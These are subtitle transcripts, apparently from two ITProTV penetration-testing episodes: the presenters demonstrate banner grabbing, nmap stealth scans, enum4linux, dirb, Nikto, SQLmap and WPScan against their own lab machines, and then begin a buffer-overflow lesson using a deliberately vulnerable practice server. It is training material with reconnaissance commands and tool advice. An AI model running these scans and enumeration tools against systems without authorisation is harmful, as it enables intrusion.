00:26:25.020\nI thought it was a Web server,\nI verified it as a Web server.\n\n551\n00:26:25.020 --> 00:26:29.300\nIt is Apache Version 2.4.25,\nas a matter of fact,\n\n552\n00:26:29.300 --> 00:26:32.880\nrunning on a Debian system, right,\na lot of good information there.\n\n553\n00:26:32.880 --> 00:26:34.580\nSo this is banner grabbing.\n\n554\n00:26:34.580 --> 00:26:38.350\nYou can connect to any port\nthat you find to be open.\n\n555\n00:26:38.350 --> 00:26:41.370\nIf it was a mail server, Port 25 it.\n\n556\n00:26:41.370 --> 00:26:42.650\nSee what comes back.\n\n557\n00:26:42.650 --> 00:26:47.260\nWelcome to mail system such and\nsuch, version such and such.\n\n558\n00:26:47.260 --> 00:26:49.390\nSo a lot of good information.\n\n559\n00:26:49.390 --> 00:26:52.220\nLet's see here,\nlet's jump to server scanning.\n\n560\n00:26:52.220 --> 00:26:54.730\nHow do we find those open ports?\n\n561\n00:26:54.730 --> 00:26:57.010\nWelcome back to the kind, baby.\n\n562\n00:26:57.010 --> 00:26:59.390\nIt's nmap, he's back.\n\n563\n00:26:59.390 --> 00:27:01.120\nFor me it is the cat's meow.\n\n564\n00:27:01.120 --> 00:27:02.370\nThere are some other good ones.\n\n565\n00:27:02.370 --> 00:27:06.230\nI like Sparta or Spartan, it's a good one.\n\n566\n00:27:06.230 --> 00:27:10.300\nIt hooks into nmap,\nit's like a frontend, and\n\n567\n00:27:10.300 --> 00:27:13.200\ninto other scanners,\ndoes an all in one thing.\n\n568\n00:27:13.200 --> 00:27:17.190\nSo let's just run nmap, nmap dash.\n\n569\n00:27:17.190 --> 00:27:19.600\nThe default is -ss,\nwhich is a stealth scan.\n\n570\n00:27:20.650 --> 00:27:25.930\nIt's not a full TCP connection,\nit's like a half connection.\n\n571\n00:27:25.930 --> 00:27:26.700\nAnd then your target, 102.168.\n\n572\n00:27:26.700 --> 00:27:31.630\nOr no, I'll do the I'll do this one,\n127 local host, and make it easy.\n\n573\n00:27:31.630 --> 00:27:34.780\nAnd badabing, it runs.\n\n574\n00:27:34.780 --> 00:27:37.360\nLook, I find port 21 is open.\n\n575\n00:27:37.360 --> 00:27:38.590\nI find port 22 is open.\n\n576\n00:27:38.590 --> 00:27:39.660\nNot only that,\n\n577\n00:27:39.660 --> 00:27:44.390\nit tells me that these are typically these\nservices that are found on these ports.\n\n578\n00:27:44.390 --> 00:27:46.590\nWhat else can we do?\n\n579\n00:27:46.590 --> 00:27:49.350\nIf you're having trouble, Stealth scan's\nnot really giving you the information\n\n580\n00:27:49.350 --> 00:27:52.130\nyou're looking for, there's a couple\nother scans you typically might try.\n\n581\n00:27:53.560 --> 00:27:56.530\nOne is a, like a UDP scan.\n\n582\n00:27:56.530 --> 00:27:59.040\nI will not run this scan\nbecause they take forever.\n\n583\n00:27:59.040 --> 00:28:00.950\nBe warned, they take forever.\n\n584\n00:28:00.950 --> 00:28:02.250\nI don't care.\n\n585\n00:28:02.250 --> 00:28:03.170\nMy goodness.\n\n586\n00:28:03.170 --> 00:28:06.460\nI think the fastest one I\never ran was like 18 minutes.\n\n587\n00:28:06.460 --> 00:28:09.060\nA little long for the show.\n\n588\n00:28:09.060 --> 00:28:10.980\nBut that will scan UDP ports.\n\n589\n00:28:10.980 --> 00:28:12.950\nDo not leave that out of your enumeration.\n\n590\n00:28:12.950 --> 00:28:18.015\nDo that scan when you\nare scanning systems, okay.\n\n591\n00:28:18.015 --> 00:28:19.455\nDo every scan that you have time to do.\n\n592\n00:28:19.455 --> 00:28:23.975\nRight, doesn't mean you can't get started,\nbut do all the scans.\n\n593\n00:28:23.975 --> 00:28:26.275\nAlso another one is good,\nis a Christmas scan, or\n\n594\n00:28:26.275 --> 00:28:30.185\nan Xmas scan,\nwhere it tries some different flags.\n\n595\n00:28:31.370 --> 00:28:34.830\nIf you want to really get in\ndepth with NMap, guess what?\n\n596\n00:28:34.830 --> 00:28:37.410\nIT Pro TV actually has a show on that.\n\n597\n00:28:37.410 --> 00:28:41.360\nWith NMap give you a whole lot more\ndetail on how to work with NMao,\n\n598\n00:28:41.360 --> 00:28:42.170\nget a lot out of it.\n\n599\n00:28:42.170 --> 00:28:44.310\nCuz this is a very, very powerful tool.\n\n600\n00:28:44.310 --> 00:28:45.030\nSo check that out.\n\n601\n00:28:46.360 --> 00:28:47.720\nAnd I can fire that off.\n\n602\n00:28:47.720 --> 00:28:54.990\nIt's basically gonna give sync\nkind of information here.\n\n603\n00:28:54.990 --> 00:28:56.664\nThere you go, 21 22 80 111.\n\n604\n00:28:56.664 --> 00:28:59.240\nLet's talk about SMB enumeration.\n\n605\n00:28:59.240 --> 00:29:02.230\nYou will notice I am not\nrunning any SMB here.\n\n606\n00:29:02.230 --> 00:29:04.470\nI do have RPC bind.\n\n607\n00:29:04.470 --> 00:29:07.360\nBut not SMB, that I know of.\n\n608\n00:29:07.360 --> 00:29:13.250\nTypically, I bet I do know one that's\nopened now, is that Windows machine.\n\n609\n00:29:13.250 --> 00:29:16.995\nSo 192, let me reconnect over here and\nget the right network going.\n\n610\n00:29:16.995 --> 00:29:20.736\n192.168.219.168 if I remember correctly.\n\n611\n00:29:20.736 --> 00:29:25.570\nAnd let's run that,\n\n612\n00:29:25.570 --> 00:29:30.060\nsee what kind of information\nthat comes out of there.\n\n613\n00:29:30.060 --> 00:29:31.300\nBecause it's a Windows machine,\n\n614\n00:29:31.300 --> 00:29:36.840\nI'm also guaranteed to find\nsomething with SNB right?\n\n615\n00:29:36.840 --> 00:29:38.350\nThis is the 139, 138,\n137, and I think fourth.\n\n616\n00:29:38.350 --> 00:29:39.700\n45 ports.\n\n617\n00:29:40.940 --> 00:29:44.940\nSo if I find any of that, look at that,\nthe Windows Firewall, it's doing its job.\n\n618\n00:29:44.940 --> 00:29:45.840\nGood job, Windows Firewall.\n\n619\n00:29:45.840 --> 00:29:47.570\nSee, it's not a piece of junk.\n\n620\n00:29:47.570 --> 00:29:48.950\nIt's a good system, right?\n\n621\n00:29:48.950 --> 00:29:53.710\nIf I were to turn that off we\nwould definitely see those ports.\n\n622\n00:29:53.710 --> 00:29:54.840\n445 is a great one.\n\n623\n00:29:54.840 --> 00:29:57.180\nWhen you find a Windows machine,\n\n624\n00:29:57.180 --> 00:30:00.220\none of the things you wanna do\nis enumerate the SMB right?\n\n625\n00:30:00.220 --> 00:30:03.010\nSo let me do,\nlet me turn off the firewall.\n\n626\n00:30:03.010 --> 00:30:04.320\nYou're like, turn off the firewall?\n\n627\n00:30:04.320 --> 00:30:06.230\nMan you're making it easy.\n\n628\n00:30:06.230 --> 00:30:08.560\nOkay, I wanna address this really quickly.\n\n629\n00:30:08.560 --> 00:30:10.180\nI know we're running out of time.\n\n630\n00:30:10.180 --> 00:30:13.700\nYes, it is easy for me to turn off\nthe firewall and show you something.\n\n631\n00:30:13.700 --> 00:30:16.960\nGuess what, there are people out there in\nthe wild and their firewall is turned off.\n\n632\n00:30:16.960 --> 00:30:19.320\nThey are not running that firewall.\n\n633\n00:30:19.320 --> 00:30:23.190\nSo why would I not scan and\nlook for those people?\n\n634\n00:30:23.190 --> 00:30:24.550\nIt's the low-hanging fruit.\n\n635\n00:30:24.550 --> 00:30:25.060\n&gt;&gt; Exactly.\n\n636\n00:30:25.060 --> 00:30:25.940\n&gt;&gt; That's what I want.\nThat's,\n\n637\n00:30:25.940 --> 00:30:29.180\nas a pen tester, I'm an organization,\nsomebody got smart and\n\n638\n00:30:29.180 --> 00:30:32.250\nfigured out the firewall was blocking them\nfrom getting to their favorite thing.\n\n639\n00:30:32.250 --> 00:30:33.160\nAnd they shut it off.\n\n640\n00:30:33.160 --> 00:30:37.350\nAnd now I'm pen testing, Hey look,\nguy's got his firewall off.\n\n641\n00:30:37.350 --> 00:30:38.920\nFirewalls get turned off.\n\n642\n00:30:38.920 --> 00:30:42.950\nSo it's not unrealistic to think that\nyou're going to come across a computer\n\n643\n00:30:42.950 --> 00:30:45.870\nwhere the firewall is not enabled,\nor misconfigured.\n\n644\n00:30:45.870 --> 00:30:47.230\n&gt;&gt; Or, yeah, at least misconfigured.\n\n645\n00:30:47.230 --> 00:30:50.280\nAnd they've got the public interface\nlisted as a private interface, so\n\n646\n00:30:50.280 --> 00:30:53.700\nit's opening up all kinds of ports and\nyou got to try and take advantage of that.\n\n647\n00:30:53.700 --> 00:30:55.260\nLike you said, the low, hanging fruit.\n\n648\n00:30:55.260 --> 00:30:55.840\n&gt;&gt; Exactly.\n\n649\n00:30:55.840 --> 00:30:56.720\nThat's what you're looking for,\n\n650\n00:30:56.720 --> 00:30:59.130\nit's always going to be\nyour Inroad into a system.\n\n651\n00:30:59.130 --> 00:30:59.920\nGrab the easy stuff.\n\n652\n00:30:59.920 --> 00:31:01.690\nSo I'm just gonna turn the firewall off.\n\n653\n00:31:01.690 --> 00:31:03.500\nAnd go to the Windows firewall.\n\n654\n00:31:03.500 --> 00:31:06.100\nCuz I want you guys to see that output.\n\n655\n00:31:06.100 --> 00:31:06.820\nIt is turned off.\n\n656\n00:31:06.820 --> 00:31:09.330\nWhy wasn't it showing me anything?\n\n657\n00:31:09.330 --> 00:31:10.360\nMaybe I did the wrong IP address.\n\n658\n00:31:10.360 --> 00:31:13.250\nLet's see here.\n\n659\n00:31:14.800 --> 00:31:15.580\nIpconfig.\n\n660\n00:31:15.580 --> 00:31:16.470\nI'm in Windows.\n\n661\n00:31:16.470 --> 00:31:20.470\n168, did I not do that right?\n\n662\n00:31:20.470 --> 00:31:21.790\n168, but it's showing I'm not closed.\n\n663\n00:31:22.950 --> 00:31:29.240\nI was having trouble with that earlier,\nso let me try it from here.\n\n664\n00:31:29.240 --> 00:31:31.700\nSo nmap -ss 192.168.219.168 let's\n\n665\n00:31:33.810 --> 00:31:38.580\nsee if this doesn't glean anymore.\n\n666\n00:31:38.580 --> 00:31:45.520\nI've got to sudo that.\n\n667\n00:31:45.520 --> 00:31:47.190\nControl s control a.\n\n668\n00:31:47.190 --> 00:31:48.580\nSudo, you're seeing the real, there we go.\n\n669\n00:31:48.580 --> 00:31:49.080\nSo there we go.\n\n670\n00:31:50.360 --> 00:31:51.323\nThere's four for five open.\n\n671\n00:31:51.323 --> 00:31:55.626\nSo now I now enumeration, I want to\nfind out what's going on with that.\n\n672\n00:31:55.626 --> 00:32:02.035\nSo we jump back to my Linux machine\nhere And I can use enum4linux.\n\n673\n00:32:02.035 --> 00:32:04.030\nenum-\n&gt;&gt; Love it.\n\n674\n00:32:04.030 --> 00:32:06.702\n&gt;&gt; Yeah, let me clear the screen.\n\n675\n00:32:06.702 --> 00:32:10.998\nenum4linux, like so, right?\n\n676\n00:32:10.998 --> 00:32:13.270\nDo a -a just to throw everything and\nthe kitchen sink.\n\n677\n00:32:13.270 --> 00:32:14.090\nThat's what I like to do.\n\n678\n00:32:14.090 --> 00:32:15.300\nI don't care about Internet traffic.\n\n679\n00:32:15.300 --> 00:32:18.240\nEspecially when I got\npermission to pen test.\n\n680\n00:32:18.240 --> 00:32:19.740\nSo I don't care about traffic.\n\n681\n00:32:19.740 --> 00:32:25.250\nAnd then the host 192.168.029.0168.\n\n682\n00:32:25.250 --> 00:32:26.080\nThere we go.\n\n683\n00:32:26.080 --> 00:32:28.150\nAnd look,\ngetting all sorts of great information.\n\n684\n00:32:28.150 --> 00:32:32.710\nYou could have done this manually using,\nwhat is it, NBT stat tool?\n\n685\n00:32:32.710 --> 00:32:34.720\nBut that would have been a lot of work.\n\n686\n00:32:34.720 --> 00:32:36.280\nThis does it for me through scripts.\n\n687\n00:32:36.280 --> 00:32:38.960\nI think it's a Python script or something.\n\n688\n00:32:38.960 --> 00:32:40.081\nBut let's see.\n\n689\n00:32:40.081 --> 00:32:42.824\nLook, it's Windows 7 Professional 6.1.\n\n690\n00:32:44.200 --> 00:32:45.770\nThere's the computer name.\n\n691\n00:32:45.770 --> 00:32:46.560\nWhy did I do that?\n\n692\n00:32:46.560 --> 00:32:47.060\nI don't know.\n\n693\n00:32:48.670 --> 00:32:52.160\nAnd information.\n\n694\n00:32:52.160 --> 00:32:53.190\nI didn't get any.\n\n695\n00:32:53.190 --> 00:32:55.990\nI wasn't able to glean any passwords.\n\n696\n00:32:55.990 --> 00:32:59.130\nI wasn't able to create,\nsay, a null session.\n\n697\n00:32:59.130 --> 00:33:00.730\nWhich would've been a great.\n\n698\n00:33:00.730 --> 00:33:03.690\nBut I did get some interesting\ninformation out of here.\n\n699\n00:33:03.690 --> 00:33:05.340\nLike that I know that\nit's running Windows 7.\n\n700\n00:33:05.340 --> 00:33:06.270\nThat's great for me to know.\n\n701\n00:33:06.270 --> 00:33:08.610\nSo now I can start curtailing my attacks.\n\n702\n00:33:09.610 --> 00:33:11.080\n&gt;&gt; Yeah, that's a really good one to run.\n\n703\n00:33:11.080 --> 00:33:14.510\nSMB can sometimes give\nup a lot of information.\n\n704\n00:33:14.510 --> 00:33:15.940\n&gt;&gt; Yeah, tons of stuff.\n\n705\n00:33:15.940 --> 00:33:18.250\nThat is one,\nif you're attacking Windows machines.\n\n706\n00:33:18.250 --> 00:33:19.920\nIf you're targeting a Windows machine.\n\n707\n00:33:19.920 --> 00:33:21.428\nYou wanna run enum4linux.\n\n708\n00:33:21.428 --> 00:33:23.390\nThat's a must-have.\n\n709\n00:33:23.390 --> 00:33:26.130\nAll right,\nnow let's move to web directory discovery.\n\n710\n00:33:26.130 --> 00:33:29.095\nA lot of times websites like to hide\ndirectories that you can actually access.\n\n711\n00:33:29.095 --> 00:33:31.110\nThey just hide them.\n\n712\n00:33:31.110 --> 00:33:32.740\nSo you think, there's good security.\n\n713\n00:33:32.740 --> 00:33:33.590\n&gt;&gt; No links to it.\n\n714\n00:33:33.590 --> 00:33:34.750\nNobody's ever gonna get there.\n\n715\n00:33:34.750 --> 00:33:35.410\n&gt;&gt; I've hidden it.\n\n716\n00:33:35.410 --> 00:33:37.060\nIt's ha-ha!\n\n717\n00:33:37.060 --> 00:33:37.760\nTake that.\n\n718\n00:33:37.760 --> 00:33:38.340\nWell guess what?\n\n719\n00:33:38.340 --> 00:33:42.940\nI can just basically crank out\na list of common Web directories.\n\n720\n00:33:42.940 --> 00:33:45.630\nAnd see if any of them come up.\n\n721\n00:33:45.630 --> 00:33:46.290\nSo that's what we'll do.\n\n722\n00:33:46.290 --> 00:33:52.210\nWe can use Dirb, it's short for\nDirBuster or directory buster.\n\n723\n00:33:52.210 --> 00:33:54.810\nThere's also GoBuster,\nworks very similarly.\n\n724\n00:33:54.810 --> 00:33:57.230\nAnd those are my two favorites.\n\n725\n00:33:57.230 --> 00:33:58.490\nSo let's stick with that.\n\n726\n00:33:58.490 --> 00:34:03.083\nBasically DirBuster,\n\n727\n00:34:03.083 --> 00:34:06.540\nlet's see here.\n\n728\n00:34:06.540 --> 00:34:10.000\nLet me go back to,\nwe are on ethernet 0, that's good.\n\n729\n00:34:10.000 --> 00:34:10.510\nSo let's do, drrb.\n\n730\n00:34:10.510 --> 00:34:14.427\nAnd I think you just throw the host at it,\nyeah, 192.168.2190146.\n\n731\n00:34:14.427 --> 00:34:15.725\nI'll attack my own machine.\n\n732\n00:34:16.855 --> 00:34:20.739\nAnd it did not like that for some reason.\n\n733\n00:34:20.739 --> 00:34:22.621\nI have to do it in HTTP.\n\n734\n00:34:22.621 --> 00:34:25.797\n[LAUGH] Yeah, add that part,\nhttp: like that.\n\n735\n00:34:25.797 --> 00:34:27.085\nThere it goes.\n\n736\n00:34:27.085 --> 00:34:31.775\nSo it is just cranking through\ndirectories looking for any directories.\n\n737\n00:34:31.775 --> 00:34:34.040\nIt has got a word list file basically.\n\n738\n00:34:34.040 --> 00:34:36.080\nSaying, here's a list\nof common directories.\n\n739\n00:34:36.080 --> 00:34:37.570\nSee if any of these actually turn up.\n\n740\n00:34:37.570 --> 00:34:40.350\nAnd you'll notice that it\nactually did find some.\n\n741\n00:34:40.350 --> 00:34:42.230\nSo there you go.\nFound one for JavaScript.\n\n742\n00:34:43.970 --> 00:34:48.440\nIt found another one that was entering\nthat JavaScript, looking for other stuff.\n\n743\n00:34:48.440 --> 00:34:49.820\njQuery was there.\n\n744\n00:34:49.820 --> 00:34:52.110\nSometimes you'll find those good things.\n\n745\n00:34:52.110 --> 00:34:55.340\nAnd you can just go into your web browser,\ntype that URL in.\n\n746\n00:34:55.340 --> 00:34:57.360\nAnd you can search that directory.\n\n747\n00:34:57.360 --> 00:34:58.770\nVery simple.\n\n748\n00:34:58.770 --> 00:35:00.178\nAll right, so that being said.\n\n749\n00:35:00.178 --> 00:35:01.680\nWe'll go to our last thing.\n\n750\n00:35:01.680 --> 00:35:05.340\nVulnerability scanning and\nweb vulnerability scanning.\n\n751\n00:35:05.340 --> 00:35:08.413\nThe heavy hitters of\nvulnerability scanning.\n\n752\n00:35:08.413 --> 00:35:10.480\nNessus, huge, been around forever.\n\n753\n00:35:10.480 --> 00:35:11.520\nUsed to be free and was awesome.\n\n754\n00:35:11.520 --> 00:35:12.850\nNow it costs a little bit of money.\n\n755\n00:35:12.850 --> 00:35:14.920\nI think you can get a free version of it.\n\n756\n00:35:14.920 --> 00:35:16.360\n&gt;&gt; I believe you,\nI know you can do a trial.\n\n757\n00:35:16.360 --> 00:35:18.155\n&gt;&gt; Yes, a trial, there you go.\n\n758\n00:35:18.155 --> 00:35:20.080\nOpenVAS, another big heavy hitter.\n\n759\n00:35:20.080 --> 00:35:22.030\nGreat piece of software.\n\n760\n00:35:22.030 --> 00:35:23.000\nWe're not going to get into that.\n\n761\n00:35:23.000 --> 00:35:25.420\nThey are shows in and of themselves.\n\n762\n00:35:25.420 --> 00:35:26.300\nI just noticed something.\n\n763\n00:35:26.300 --> 00:35:29.250\nLarry in the chatroom said robots.txt.\n\n764\n00:35:29.250 --> 00:35:30.464\nThat's a good one to know.\n\n765\n00:35:30.464 --> 00:35:31.760\n&gt;&gt; [LAUGH].\n&gt;&gt; So if your DirBuster or\n\n766\n00:35:31.760 --> 00:35:32.640\nGoBuster finds that.\n\n767\n00:35:33.920 --> 00:35:36.100\nThat's good stuff, look at that file.\n\n768\n00:35:36.100 --> 00:35:38.160\nBut back to vulnerability scanners.\n\n769\n00:35:38.160 --> 00:35:42.440\nWe did Nessus, OpenVAS,\nNmap is actually a vulnerability scanner.\n\n770\n00:35:42.440 --> 00:35:45.610\nIt has a table of vulnerabilities\nthat it can look for\n\n771\n00:35:45.610 --> 00:35:48.300\nusing the Nmap scripting engine, the NSE.\n\n772\n00:35:48.300 --> 00:35:50.240\nAnd then, of course, Metasploit.\n\n773\n00:35:50.240 --> 00:35:53.460\nNo list of vulnerability scanners\nis complete without Metasploit.\n\n774\n00:35:53.460 --> 00:35:57.140\nWe are not going to use\nMetasploit in this class.\n\n775\n00:35:57.140 --> 00:35:59.240\nWe're gonna use one portion of it for\n\n776\n00:35:59.240 --> 00:36:02.070\na very short amount of time for\none specific thing.\n\n777\n00:36:02.070 --> 00:36:03.100\nBut we're not using Metasploit.\n\n778\n00:36:03.100 --> 00:36:04.920\nWe're going to do it the hard way.\n\n779\n00:36:04.920 --> 00:36:06.840\nThat's what we like to do here.\n\n780\n00:36:06.840 --> 00:36:08.430\nSo that if you don't have Metasploit.\n\n781\n00:36:08.430 --> 00:36:09.980\nYou can still do these things.\n\n782\n00:36:09.980 --> 00:36:10.890\nAnd if you do have Metasploit.\n\n783\n00:36:10.890 --> 00:36:13.410\nYou now know what's happening\nunderneath the hood.\n\n784\n00:36:13.410 --> 00:36:15.530\nThat's what our purpose is.\n\n785\n00:36:15.530 --> 00:36:19.100\nAnd then web, Nikto, I love Nikto.\n\n786\n00:36:19.100 --> 00:36:20.300\nMan, that's a great scanner.\n\n787\n00:36:20.300 --> 00:36:24.740\nIt basically scans websites for\nknown vulnerabilities.\n\n788\n00:36:24.740 --> 00:36:26.465\nAnd then outputs that to you.\n\n789\n00:36:26.465 --> 00:36:28.366\nAnd let's take a look, I'll show you some.\n\n790\n00:36:28.366 --> 00:36:32.810\nLet's attack a list of which one.\n\n791\n00:36:32.810 --> 00:36:40.090\nLet's go to [SOUND] let's look at PalmLab.\n\n792\n00:36:40.090 --> 00:36:43.949\nUnless I know I've got\na cat PalmLab Nikto.\n\n793\n00:36:43.949 --> 00:36:45.020\nAnd there you go.\n\n794\n00:36:45.020 --> 00:36:48.580\nSo it starts telling you, look,\nthere's a login.php page.\n\n795\n00:36:48.580 --> 00:36:52.830\nA cookie PHP session ID created\nwithout an HTTP only flag.\n\n796\n00:36:52.830 --> 00:36:56.920\nSo it starts giving you\ninformation about these machines.\n\n797\n00:36:56.920 --> 00:36:58.190\nThat they don't really want you to know.\n\n798\n00:36:58.190 --> 00:36:59.573\nAny of the vulnerabilities that it finds.\n\n799\n00:36:59.573 --> 00:37:00.390\nIt pops that out for you.\n\n800\n00:37:00.390 --> 00:37:02.325\nAnd you can start\nattacking those weak spots.\n\n801\n00:37:02.325 --> 00:37:04.930\nSQLmap, great stuff.\n\n802\n00:37:04.930 --> 00:37:08.330\nSQL Injection, it is hard and difficult.\n\n803\n00:37:08.330 --> 00:37:11.870\nBecause it's a lot of guessing and\nhoping that things will work.\n\n804\n00:37:13.090 --> 00:37:16.300\nSqlmap takes out all of\nthe difficulty of it.\n\n805\n00:37:16.300 --> 00:37:17.640\nYou just run SQLmap against something.\n\n806\n00:37:17.640 --> 00:37:21.010\nAnd it says, here's all the\nvulnerabilities I've found and exploited.\n\n807\n00:37:21.010 --> 00:37:22.080\nDo with it as you will.\n\n808\n00:37:22.080 --> 00:37:24.240\nIt is a scary piece of software.\n\n809\n00:37:24.240 --> 00:37:26.200\nAnd last but not least, WPScan.\n\n810\n00:37:26.200 --> 00:37:29.050\nWordpress is a huge thing.\n\n811\n00:37:29.050 --> 00:37:32.130\nA lot of Wordpress sites\non the Internet today.\n\n812\n00:37:32.130 --> 00:37:35.410\nWPScan is kind of like SQLmap.\n\n813\n00:37:35.410 --> 00:37:36.440\nIt's stinking scary.\n\n814\n00:37:36.440 --> 00:37:37.960\nIt finds stuff.\n\n815\n00:37:37.960 --> 00:37:40.735\nUsernames, passwords, crappy logins.\n\n816\n00:37:40.735 --> 00:37:44.570\nIt will crack passwords for\nyou so that you can gain access.\n\n817\n00:37:44.570 --> 00:37:46.630\nGreat tools, jump on those.\n\n818\n00:37:46.630 --> 00:37:48.290\nWe're gonna use them throughout.\n\n819\n00:37:48.290 --> 00:37:51.030\nThat's why I'm not kind of like\nwalking you through each one.\n\n820\n00:37:51.030 --> 00:37:53.020\nHere's how you do this,\nand here's another option.\n\n821\n00:37:53.020 --> 00:37:55.420\nWe're gonna be using them\nthroughout the series.\n\n822\n00:37:55.420 --> 00:37:57.880\nSo you will see them work.\n\n823\n00:37:57.880 --> 00:37:58.450\n&gt;&gt; I'm excited.\n\n824\n00:37:58.450 --> 00:38:00.190\nCan't wait to see all of that.\n\n825\n00:38:00.190 --> 00:38:02.030\nBut we do thank you Daniel.\n\n826\n00:38:02.030 --> 00:38:04.390\nWe got a good look there at\nthe scanning and enumeration.\n\n827\n00:38:04.390 --> 00:38:06.208\nWe looked at a scanning machines.\n\n828\n00:38:06.208 --> 00:38:08.890\nAnd doing port scanning,\ndoing enumeration.\n\n829\n00:38:08.890 --> 00:38:11.970\nTook a look at enumerating some SMB.\n\n830\n00:38:11.970 --> 00:38:14.600\nWe also took a look at banner grabbing.\n\n831\n00:38:14.600 --> 00:38:18.450\nA very important concept,\nbecause you might see a port's open.\n\n832\n00:38:18.450 --> 00:38:20.650\nAnd you know, okay, that's port 80.\n\n833\n00:38:20.650 --> 00:38:22.000\nIt's a web server.\n\n834\n00:38:22.000 --> 00:38:23.150\nBut I need to know more than that.\n\n835\n00:38:23.150 --> 00:38:26.810\nIf I'm gonna find a vulnerability\nthat I can try to exploit.\n\n836\n00:38:26.810 --> 00:38:29.220\nI need to know what web\nservice it's running.\n\n837\n00:38:29.220 --> 00:38:30.790\nWhat version it's running.\n\n838\n00:38:30.790 --> 00:38:35.373\nThis vulnerability or\nthis exploit might work against Apache 7.\n\n839\n00:38:35.373 --> 00:38:37.990\nBut not Apache 8 or 9.\n\n840\n00:38:37.990 --> 00:38:40.102\nRight?\nSo I need to know those version numbers.\n\n841\n00:38:40.102 --> 00:38:42.640\nBanner grabbing is the way to do that.\n\n842\n00:38:42.640 --> 00:38:45.160\nAnd then we talked about some of\nthe different server scanning.\n\n843\n00:38:45.160 --> 00:38:48.290\nAs well as vulnerability scanning,\nsome great tools there.\n\n844\n00:38:48.290 --> 00:38:49.962\nNessus, I know is a great one.\n\n845\n00:38:49.962 --> 00:38:53.250\nNikto, a great one for scanning websites\nand finding those vulnerabilities.\n\n846\n00:38:53.250 --> 00:38:56.460\nAnd this kind of stuff just,\nit's gathering information.\n\n847\n00:38:56.460 --> 00:39:01.190\nThat we might then be able to use in\nour penetration test or in our attack.\n\n848\n00:39:01.190 --> 00:39:02.770\nSo, we thank you for that Daniel.\n\n849\n00:39:02.770 --> 00:39:05.170\nWe hope everybody out there\nenjoyed watching this one.\n\n850\n00:39:05.170 --> 00:39:08.070\nSigning off for IT Pro TV,\nI've been your host Mike Rodrick.\n\n851\n00:39:08.070 --> 00:39:08.860\n&gt;&gt; I'm Daniel Lowrie.\n\n852\n00:39:08.860 --> 00:39:13.841\n&gt;&gt; And we'll see you next time.\n\n853\n00:39:13.841 -->

welcome to another\nexciting episode here at ITProTV.\n\n4\n00:00:15.470 --> 00:00:20.930\nI'm your host Mike Rodrick and\ntoday we are doing penetration testing.\n\n5\n00:00:20.930 --> 00:00:21.890\nThat's right.\n\n6\n00:00:21.890 --> 00:00:26.480\nIn this episode we're going to be focusing\nin on a big part of penetration testing,\n\n7\n00:00:26.480 --> 00:00:30.310\na big part of a lot of attacks that\nwe see out there on the Internet,\n\n8\n00:00:30.310 --> 00:00:34.890\nin the wild, based on something\nknown as a buffer overflow.\n\n9\n00:00:34.890 --> 00:00:36.360\nOoh, good stuff there.\n\n10\n00:00:36.360 --> 00:00:40.350\nAnd here to explain to us what\na buffer overflow even means,\n\n11\n00:00:40.350 --> 00:00:44.680\nhow it does what it does, or\nwhy it does what it does, and\n\n12\n00:00:44.680 --> 00:00:48.030\nmaybe even how to do it ourselves,\nis Mr. Daniel Lowrie.\n\n13\n00:00:48.030 --> 00:00:49.200\nWelcome back Daniel.\n\n14\n00:00:49.200 --> 00:00:50.180\n&gt;&gt; So glad to be back.\n\n15\n00:00:50.180 --> 00:00:54.370\nSo we're continuing on with our\npenetration testing show as Mike as been\n\n16\n00:00:54.370 --> 00:00:56.582\nalluding to, not so unsubtlely.\n\n17\n00:00:56.582 --> 00:00:57.094\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n18\n00:00:57.094 --> 00:00:58.730\n&gt;&gt; If that makes any sense.\n\n19\n00:00:58.730 --> 00:01:01.100\nAnd we are continuing on,\nbut forever flows.\n\n20\n00:01:01.100 --> 00:01:03.790\nThis is a weird topic, I say weird topic,\n\n21\n00:01:03.790 --> 00:01:07.360\nprobably a topic that is\nshrouded in mystique.\n\n22\n00:01:07.360 --> 00:01:09.790\nRight?\nIf you've taken a security class before,\n\n23\n00:01:09.790 --> 00:01:12.250\nI guarantee you've heard\nthe term buffer overflow.\n\n24\n00:01:12.250 --> 00:01:16.250\nBut if you've haven't security class\nbefore, you decided you know what I'm\n\n25\n00:01:16.250 --> 00:01:19.920\ngonna get into IT and this happens to be\nthe first show you've ever seen about it.\n\n26\n00:01:19.920 --> 00:01:22.882\nBuffer overflow you're like yeah\nthat means absolutely zilcho to me.\n\n27\n00:01:22.882 --> 00:01:23.590\n&gt;&gt; [LAUGH].\n\n28\n00:01:23.590 --> 00:01:26.870\nSo let's, we're gonna start there,\ngive you some kind of back story.\n\n29\n00:01:26.870 --> 00:01:29.300\nWhat a buffer overflow is,\nhow they work, and\n\n30\n00:01:29.300 --> 00:01:33.100\nwhy we want to be able to do it,\nand you know what?\n\n31\n00:01:33.100 --> 00:01:35.620\nI think I wanna Tarantino this.\n\n32\n00:01:35.620 --> 00:01:38.570\n&gt;&gt; Yeah?\n&gt;&gt; I'm gonna start with the end, with what\n\n33\n00:01:38.570 --> 00:01:43.000\nwe're gonna do, and see that work, and\nthen we're gonna show you how we did it.\n\n34\n00:01:43.000 --> 00:01:43.910\n&gt;&gt; I like it.\n&gt;&gt; How does that work?\n\n35\n00:01:43.910 --> 00:01:45.710\nAll right,\nwe're gonna jump right into the fray.\n\n36\n00:01:45.710 --> 00:01:47.300\nSo let's jump onto my computer.\n\n37\n00:01:47.300 --> 00:01:49.800\nI've got my Linux,\nKali Linux is up and running.\n\n38\n00:01:49.800 --> 00:01:53.240\nI also have my Windows 7 machine as well.\n\n39\n00:01:53.240 --> 00:01:55.460\nWindow 7 machine is gonna act as a server,\nall right.\n\n40\n00:01:55.460 --> 00:01:59.440\nIt's running a vulnerable server,\nsomething vulnerable to a buffer overflow.\n\n41\n00:01:59.440 --> 00:02:01.330\nActually it's not yet, but\nI have to actually start that.\n\n42\n00:02:01.330 --> 00:02:02.720\nSo let's do that.\n\n43\n00:02:02.720 --> 00:02:04.790\nAnd it's so aptly called vuln.server.\n\n44\n00:02:04.790 --> 00:02:07.762\nI will let you know right now\nyou can go out to the interwebs,\n\n45\n00:02:07.762 --> 00:02:10.150\nGoogle vuln.server, and download this.\n\n46\n00:02:10.150 --> 00:02:12.930\nSo that's something you probably want\nto do if you want to practice these\n\n47\n00:02:12.930 --> 00:02:14.520\nthings as we go.\n\n48\n00:02:14.520 --> 00:02:16.920\n&gt;&gt; On your sandbox machine,\nnot your production machine.\n\n49\n00:02:16.920 --> 00:02:17.860\n&gt;&gt; Yeah, yeah.\n\n50\n00:02:17.860 --> 00:02:19.337\n&gt;&gt; Better mark that 